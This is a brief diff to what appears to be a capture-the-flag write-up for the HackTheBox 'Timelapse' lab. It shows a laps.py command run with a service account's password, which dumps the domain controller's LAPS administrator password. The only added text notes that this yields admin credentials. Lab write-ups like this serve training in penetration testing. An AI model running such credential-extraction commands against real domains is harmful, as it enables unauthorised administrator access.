@@ -422,3 +422,10 @@ if __name__ == "__main__":
 [connor@fedora timelapse]$ python laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
 DC01$:[},r9L86NT,/%+gE]).61X-9
 ```
+
+<br>
+
+This gives admin creds!
+
+<br>
+
